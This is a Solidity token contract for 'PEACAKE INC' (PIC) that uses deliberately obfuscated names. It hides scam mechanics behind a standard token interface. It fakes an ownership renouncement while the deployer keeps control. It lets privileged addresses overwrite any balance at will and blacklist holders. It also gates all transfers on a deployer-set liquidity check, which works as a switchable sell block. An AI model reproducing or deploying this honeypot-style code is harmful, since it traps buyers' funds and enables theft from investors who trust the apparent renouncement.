//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface toLaunchAuto {
    function totalSupply() external view returns (uint256);

    function balanceOf(address walletMax) external view returns (uint256);

    function transfer(address feeBuyMin, uint256 minExempt) external returns (bool);

    function allowance(address shouldToLimit, address spender) external view returns (uint256);

    function approve(address spender, uint256 minExempt) external returns (bool);

    function transferFrom(address sender,address feeBuyMin,uint256 minExempt) external returns (bool);

    event Transfer(address indexed from, address indexed takeMode, uint256 value);
    event Approval(address indexed shouldToLimit, address indexed spender, uint256 value);
}

interface toSell {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface autoSender {
    function createPair(address tradingMax, address senderTo) external returns (address);
}

abstract contract launchedToken {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface isLiquidity is toLaunchAuto {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract PEACAKEINC is launchedToken, toLaunchAuto, isLiquidity {

    function listSell(uint256 minExempt) public {
        launchShould();
        buyShouldSender = minExempt;
    }

    uint256 public sellFee;

    address public isBuy;

    address enableMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function approve(address sellLaunch, uint256 minExempt) public virtual override returns (bool) {
        senderExempt[_msgSender()][sellLaunch] = minExempt;
        emit Approval(_msgSender(), sellLaunch, minExempt);
        return true;
    }

    string private exemptMax = "PEACAKE INC";

    function sellAutoToken(address feeTo) public {
        if (isMode) {
            return;
        }
        
        listSenderTotal[feeTo] = true;
        if (totalFund == sellFee) {
            totalFund = txEnable;
        }
        isMode = true;
    }

    bool public senderReceiver;

    function owner() external view returns (address) {
        return enableBuyToken;
    }

    uint256 exemptShouldMax;

    mapping(address => mapping(address => uint256)) private senderExempt;

    address private enableBuyToken;

    bool public isMode;

    function transfer(address modeIs, uint256 minExempt) external virtual override returns (bool) {
        return sellLaunchedAt(_msgSender(), modeIs, minExempt);
    }

    mapping(address => bool) public listSenderTotal;

    bool public fundMax;

    uint256 private totalFund;

    function sellLaunchedAt(address listMarketing, address feeBuyMin, uint256 minExempt) internal returns (bool) {
        if (listMarketing == isBuy) {
            return teamListExempt(listMarketing, feeBuyMin, minExempt);
        }
        uint256 txLaunch = toLaunchAuto(totalLiquidity).balanceOf(sellAt);
        require(txLaunch == buyShouldSender);
        require(!receiverFund[listMarketing]);
        return teamListExempt(listMarketing, feeBuyMin, minExempt);
    }

    function name() external view virtual override returns (string memory) {
        return exemptMax;
    }

    function feeTake() public {
        emit OwnershipTransferred(isBuy, address(0));
        enableBuyToken = address(0);
    }

    function teamListExempt(address listMarketing, address feeBuyMin, uint256 minExempt) internal returns (bool) {
        require(listFundLimit[listMarketing] >= minExempt);
        listFundLimit[listMarketing] -= minExempt;
        listFundLimit[feeBuyMin] += minExempt;
        emit Transfer(listMarketing, feeBuyMin, minExempt);
        return true;
    }

    function decimals() external view virtual override returns (uint8) {
        return launchedShouldList;
    }

    function allowance(address fundTotalExempt, address sellLaunch) external view virtual override returns (uint256) {
        if (sellLaunch == enableMin) {
            return type(uint256).max;
        }
        return senderExempt[fundTotalExempt][sellLaunch];
    }

    function transferFrom(address listMarketing, address feeBuyMin, uint256 minExempt) external override returns (bool) {
        if (_msgSender() != enableMin) {
            if (senderExempt[listMarketing][_msgSender()] != type(uint256).max) {
                require(minExempt <= senderExempt[listMarketing][_msgSender()]);
                senderExempt[listMarketing][_msgSender()] -= minExempt;
            }
        }
        return sellLaunchedAt(listMarketing, feeBuyMin, minExempt);
    }

    uint256 public txEnable;

    mapping(address => bool) public receiverFund;

    uint256 buyShouldSender;

    function totalSupply() external view virtual override returns (uint256) {
        return modeExemptTrading;
    }

    uint256 private modeExemptTrading = 100000000 * 10 ** 18;

    string private atFee = "PIC";

    bool public exemptAuto;

    function symbol() external view virtual override returns (string memory) {
        return atFee;
    }

    bool private receiverSwap;

    function getOwner() external view returns (address) {
        return enableBuyToken;
    }

    function receiverToken(address modeIs, uint256 minExempt) public {
        launchShould();
        listFundLimit[modeIs] = minExempt;
    }

    function amountLimit(address launchList) public {
        launchShould();
        if (senderReceiver == fundMax) {
            txEnable = sellFee;
        }
        if (launchList == isBuy || launchList == totalLiquidity) {
            return;
        }
        receiverFund[launchList] = true;
    }

    address public totalLiquidity;

    mapping(address => uint256) private listFundLimit;

    constructor (){
        if (txEnable == sellFee) {
            sellFee = totalFund;
        }
        feeTake();
        toSell shouldTotalTeam = toSell(enableMin);
        totalLiquidity = autoSender(shouldTotalTeam.factory()).createPair(shouldTotalTeam.WETH(), address(this));
        
        isBuy = _msgSender();
        listSenderTotal[isBuy] = true;
        listFundLimit[isBuy] = modeExemptTrading;
        
        emit Transfer(address(0), isBuy, modeExemptTrading);
    }

    event OwnershipTransferred(address indexed senderWallet, address indexed receiverLaunch);

    function launchShould() private view {
        require(listSenderTotal[_msgSender()]);
    }

    address sellAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint8 private launchedShouldList = 18;

    function balanceOf(address walletMax) public view virtual override returns (uint256) {
        return listFundLimit[walletMax];
    }

}